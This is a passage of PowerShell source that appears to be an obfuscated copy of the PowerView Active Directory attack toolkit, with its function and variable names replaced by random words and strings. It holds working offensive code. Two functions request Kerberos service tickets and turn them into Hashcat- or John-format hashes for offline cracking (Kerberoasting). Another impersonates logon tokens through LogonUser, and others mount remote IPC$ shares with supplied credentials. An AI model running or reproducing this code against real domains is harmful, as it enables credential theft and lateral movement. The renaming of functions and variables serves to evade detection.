                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        intrenches -fqOhNdkk99 $nmAqQmMs99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[bandaging] Error converting SID '$nmAqQmMs99' : $_"
            }
        }
    }
}
function intrenches {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $fqOhNdkk99,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $vxxrLejt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $dsxwLdBu99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }
        function Invoke-Method([__ComObject] $Object, [String] $GxydJySm99, $kkHHhJJv99) {
            $wzSptcsg99 = $Null
            $wzSptcsg99 = $Object.GetType().InvokeMember($GxydJySm99, 'InvokeMethod', $NULL, $Object, $kkHHhJJv99)
            Write-Output $wzSptcsg99
        }
        function Get-Property([__ComObject] $Object, [String] $hiZpQahc99) {
            $Object.GetType().InvokeMember($hiZpQahc99, 'GetProperty', $NULL, $Object, $NULL)
        }
        function Set-Property([__ComObject] $Object, [String] $hiZpQahc99, $kkHHhJJv99) {
            [Void] $Object.GetType().InvokeMember($hiZpQahc99, 'SetProperty', $NULL, $Object, $kkHHhJJv99)
        }
        if ($PSBoundParameters['Server']) {
            $KtKEWudv99 = 2
            $PfhOZyeB99 = $YdBDxrjg99
        }
        elseif ($PSBoundParameters['Domain']) {
            $KtKEWudv99 = 1
            $PfhOZyeB99 = $jeGdZvYa99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $DOZPHpup99.GetNetworkCredential()
            $KtKEWudv99 = 1
            $PfhOZyeB99 = $Cred.Domain
        }
        else {
            $KtKEWudv99 = 3
            $PfhOZyeB99 = $Null
        }
    }
    PROCESS {
        ForEach ($PXMOOppE99 in $fqOhNdkk99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($PXMOOppE99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $EjtQUTbF99 = $dsxwLdBu99['DomainSimple']
                }
                else {
                    $EjtQUTbF99 = $dsxwLdBu99['NT4']
                }
            }
            else {
                $EjtQUTbF99 = $dsxwLdBu99[$vxxrLejt99]
            }
            $GJieSYsb99 = New-Object -ComObject NameTranslate
            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $DOZPHpup99.GetNetworkCredential()
                    Invoke-Method $GJieSYsb99 'InitEx' (
                        $KtKEWudv99,
                        $PfhOZyeB99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[intrenches] Error initializing translation for '$fqOhNdkk99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $GJieSYsb99 'Init' (
                        $KtKEWudv99,
                        $PfhOZyeB99
                    )
                }
                catch {
                    Write-Verbose "[intrenches] Error initializing translation for '$fqOhNdkk99' : $_"
                }
            }
            Set-Property $GJieSYsb99 'ChaseReferral' (0x60)
            try {
                $Null = Invoke-Method $GJieSYsb99 'Set' (8, $PXMOOppE99)
                Invoke-Method $GJieSYsb99 'Get' ($EjtQUTbF99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[intrenches] Error translating '$PXMOOppE99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function discretion {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,
        [Switch]
        $gwtWSmbJ99
    )
    BEGIN {
        $syUrscTJ99 = New-Object System.Collections.Specialized.OrderedDictionary
        $syUrscTJ99.Add("SCRIPT", 1)
        $syUrscTJ99.Add("ACCOUNTDISABLE", 2)
        $syUrscTJ99.Add("HOMEDIR_REQUIRED", 8)
        $syUrscTJ99.Add("LOCKOUT", 16)
        $syUrscTJ99.Add("PASSWD_NOTREQD", 32)
        $syUrscTJ99.Add("PASSWD_CANT_CHANGE", 64)
        $syUrscTJ99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $syUrscTJ99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $syUrscTJ99.Add("NORMAL_ACCOUNT", 512)
        $syUrscTJ99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $syUrscTJ99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $syUrscTJ99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $syUrscTJ99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $syUrscTJ99.Add("MNS_LOGON_ACCOUNT", 131072)
        $syUrscTJ99.Add("SMARTCARD_REQUIRED", 262144)
        $syUrscTJ99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $syUrscTJ99.Add("NOT_DELEGATED", 1048576)
        $syUrscTJ99.Add("USE_DES_KEY_ONLY", 2097152)
        $syUrscTJ99.Add("DONT_REQ_PREAUTH", 4194304)
        $syUrscTJ99.Add("PASSWORD_EXPIRED", 8388608)
        $syUrscTJ99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $syUrscTJ99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }
    PROCESS {
        $jymInIeo99 = New-Object System.Collections.Specialized.OrderedDictionary
        if ($gwtWSmbJ99) {
            ForEach ($VPkznDAA99 in $syUrscTJ99.GetEnumerator()) {
                if ( ($Value -band $VPkznDAA99.Value) -eq $VPkznDAA99.Value) {
                    $jymInIeo99.Add($VPkznDAA99.Name, "$($VPkznDAA99.Value)+")
                }
                else {
                    $jymInIeo99.Add($VPkznDAA99.Name, "$($VPkznDAA99.Value)")
                }
            }
        }
        else {
            ForEach ($VPkznDAA99 in $syUrscTJ99.GetEnumerator()) {
                if ( ($Value -band $VPkznDAA99.Value) -eq $VPkznDAA99.Value) {
                    $jymInIeo99.Add($VPkznDAA99.Name, "$($VPkznDAA99.Value)")
                }
            }
        }
        $jymInIeo99
    }
}
function sincerer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters['Domain'] -or ($fqOhNdkk99 -match '.+\\.+')) {
            if ($fqOhNdkk99 -match '.+\\.+') {
                $HMrzFTFG99 = $fqOhNdkk99 | intrenches -vxxrLejt99 Canonical
                if ($HMrzFTFG99) {
                    $pTZFHgHS99 = $HMrzFTFG99.SubString(0, $HMrzFTFG99.IndexOf('/'))
                    $owOROgpB99 = $fqOhNdkk99.Split('\')[1]
                    Write-Verbose "[sincerer] Binding to domain '$pTZFHgHS99'"
                }
            }
            else {
                $owOROgpB99 = $fqOhNdkk99
                Write-Verbose "[sincerer] Binding to domain '$jeGdZvYa99'"
                $pTZFHgHS99 = $jeGdZvYa99
            }
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[sincerer] Using alternate credentials'
                $PtKFiSBc99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $pTZFHgHS99, $DOZPHpup99.UserName, $DOZPHpup99.GetNetworkCredential().Password)
            }
            else {
                $PtKFiSBc99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $pTZFHgHS99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[sincerer] Using alternate credentials'
                $KbpiCdvX99 = Herodotus | Select-Object -ExpandProperty Name
                $PtKFiSBc99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $KbpiCdvX99, $DOZPHpup99.UserName, $DOZPHpup99.GetNetworkCredential().Password)
            }
            else {
                $PtKFiSBc99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $owOROgpB99 = $fqOhNdkk99
        }
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $PtKFiSBc99
        $Out | Add-Member Noteproperty 'Identity' $owOROgpB99
        $Out
    }
    catch {
        Write-Warning "[sincerer] Error creating binding for object ('$fqOhNdkk99') context : $_"
    }
}
function demilitarized {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99
    )
    BEGIN {
        $iXhUNddI99 = [Activator]::CreateInstance($DznfDdmZ99)
        $iXhUNddI99.dwType = 1
    }
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($uiVSlknQ99 in $kyzUdCPm99) {
                $uiVSlknQ99 = $uiVSlknQ99.Trim('\')
                $Paths += ,"\\$uiVSlknQ99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($mLpzMLwf99 in $Paths) {
            $iXhUNddI99.lpRemoteName = $mLpzMLwf99
            Write-Verbose "[demilitarized] Attempting to mount: $mLpzMLwf99"
            $sBoEOClb99 = $Mpr::WNetAddConnection2W($iXhUNddI99, $DOZPHpup99.GetNetworkCredential().Password, $DOZPHpup99.UserName, 4)
            if ($sBoEOClb99 -eq 0) {
                Write-Verbose "$mLpzMLwf99 successfully mounted"
            }
            else {
                Throw "[demilitarized] error mounting $mLpzMLwf99 : $(([ComponentModel.Win32Exception]$sBoEOClb99).Message)"
            }
        }
    }
}
function calibrating {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($uiVSlknQ99 in $kyzUdCPm99) {
                $uiVSlknQ99 = $uiVSlknQ99.Trim('\')
                $Paths += ,"\\$uiVSlknQ99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($mLpzMLwf99 in $Paths) {
            Write-Verbose "[calibrating] Attempting to unmount: $mLpzMLwf99"
            $sBoEOClb99 = $Mpr::WNetCancelConnection2($mLpzMLwf99, 0, $True)
            if ($sBoEOClb99 -eq 0) {
                Write-Verbose "$mLpzMLwf99 successfully ummounted"
            }
            else {
                Throw "[calibrating] error unmounting $mLpzMLwf99 : $(([ComponentModel.Win32Exception]$sBoEOClb99).Message)"
            }
        }
    }
}
function Salem {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $ojJXfOPB99,
        [Switch]
        $Quiet
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[Salem] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }
    if ($PSBoundParameters['TokenHandle']) {
        $VeZAFhRy99 = $ojJXfOPB99
    }
    else {
        $VeZAFhRy99 = [IntPtr]::Zero
        $ZKPIqOqS99 = $DOZPHpup99.GetNetworkCredential()
        $BUwbCXsa99 = $ZKPIqOqS99.Domain
        $rYdFULpQ99 = $ZKPIqOqS99.UserName
        Write-Warning "[Salem] Executing LogonUser() with user: $($BUwbCXsa99)\$($rYdFULpQ99)"
        $sBoEOClb99 = $iVwkknTh99::LogonUser($rYdFULpQ99, $BUwbCXsa99, $ZKPIqOqS99.Password, 9, 3, [ref]$VeZAFhRy99);$KcubREEf99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not $sBoEOClb99) {
            throw "[Salem] LogonUser() Error: $(([ComponentModel.Win32Exception] $KcubREEf99).Message)"
        }
    }
    $sBoEOClb99 = $iVwkknTh99::ImpersonateLoggedOnUser($VeZAFhRy99)
    if (-not $sBoEOClb99) {
        throw "[Salem] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $KcubREEf99).Message)"
    }
    Write-Verbose "[Salem] Alternate credentials successfully impersonated"
    $VeZAFhRy99
}
function contemptuous {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $ojJXfOPB99
    )
    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[contemptuous] Reverting token impersonation and closing LogonUser() token handle"
        $sBoEOClb99 = $Kernel32::CloseHandle($ojJXfOPB99)
    }
    $sBoEOClb99 = $iVwkknTh99::RevertToSelf();$KcubREEf99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not $sBoEOClb99) {
        throw "[contemptuous] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $KcubREEf99).Message)"
    }
    Write-Verbose "[contemptuous] Token impersonation successfully reverted"
}
function easiness {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $PJyIiptW99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $hDRRLCBA99 = $User
        }
        else {
            $hDRRLCBA99 = $SPN
        }
        ForEach ($Object in $hDRRLCBA99) {
            if ($PSBoundParameters['User']) {
                $CoJIKPtD99 = $Object.ServicePrincipalName
                $OaqRhTVK99 = $Object.SamAccountName
                $csECOtuR99 = $Object.DistinguishedName
            }
            else {
                $CoJIKPtD99 = $Object
                $OaqRhTVK99 = 'UNKNOWN'
                $csECOtuR99 = 'UNKNOWN'
            }
            if ($CoJIKPtD99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $CoJIKPtD99 = $CoJIKPtD99[0]
            }
            try {
                $aUokBIzl99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $CoJIKPtD99
            }
            catch {
                Write-Warning "[easiness] Error requesting ticket for SPN '$CoJIKPtD99' from user '$csECOtuR99' : $_"
            }
            if ($aUokBIzl99) {
                $RJqtDQQx99 = $aUokBIzl99.GetRequest()
            }
            if ($RJqtDQQx99) {
                $Out = New-Object PSObject
                $CxIMaBcQ99 = [System.BitConverter]::ToString($RJqtDQQx99) -replace '-'
                $Out | Add-Member Noteproperty 'SamAccountName' $OaqRhTVK99
                $Out | Add-Member Noteproperty 'DistinguishedName' $csECOtuR99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $aUokBIzl99.ServicePrincipalName
                if($CxIMaBcQ99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $PvxGaYSO99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $WCCftRlp99 = $Matches.DataToEnd.Substring(0,$PvxGaYSO99*2)
                    if($Matches.DataToEnd.Substring($PvxGaYSO99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($aUokBIzl99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($RJqtDQQx99).Replace('-',''))
                    } else {
                        $Hash = "$($WCCftRlp99.Substring(0,32))`$$($WCCftRlp99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($aUokBIzl99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($RJqtDQQx99).Replace('-',''))
                }
                if($Hash) {
                    if ($PJyIiptW99 -match 'John') {
                        $frIcPmHd99 = "`$vAGybvdP99`$$($aUokBIzl99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($csECOtuR99 -ne 'UNKNOWN') {
                            $BUwbCXsa99 = $csECOtuR99.SubString($csECOtuR99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $BUwbCXsa99 = 'UNKNOWN'
                        }
                        $frIcPmHd99 = "`$vAGybvdP99`$$($Etype)`$*$OaqRhTVK99`$$BUwbCXsa99`$$($aUokBIzl99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $frIcPmHd99
                }
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function deniability {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $PJyIiptW99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $BuvdgfSf99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $BuvdgfSf99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $BuvdgfSf99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $BuvdgfSf99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $BuvdgfSf99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $BuvdgfSf99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $BuvdgfSf99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BuvdgfSf99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $BuvdgfSf99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $BuvdgfSf99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $BuvdgfSf99['Identity'] = $fqOhNdkk99 }
        togae @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | easiness -PJyIiptW99 $PJyIiptW99
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function ickiest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function Russians {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )
            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $cdBquEYr99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }
            $GLtebiSV99 = @()
            $GLtebiSV99 += $cdBquEYr99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $cdBquEYr99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $GLtebiSV99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($GLtebiSV99 | Where-Object {$_}) -join ','
        }
        $AZcgOYJm99 = @{}
        if ($PSBoundParameters['Credential']) { $AZcgOYJm99['Credential'] = $DOZPHpup99 }
        $gnbmJgNr99 = @{}
    }
    PROCESS {
        ForEach ($mLpzMLwf99 in $Path) {
            try {
                if (($mLpzMLwf99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $QpWiCdMP99 = (New-Object System.Uri($mLpzMLwf99)).Host
                    if (-not $gnbmJgNr99[$QpWiCdMP99]) {
                        demilitarized -kyzUdCPm99 $QpWiCdMP99 -DOZPHpup99 $DOZPHpup99
                        $gnbmJgNr99[$QpWiCdMP99] = $True
                    }
                }
                $ACL = Get-Acl -Path $mLpzMLwf99
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = bandaging -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $mLpzMLwf99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Russians -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[ickiest] error: $_"
            }
        }
    }
    END {
        $gnbmJgNr99.Keys | calibrating
    }
}
function decaffeinating {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
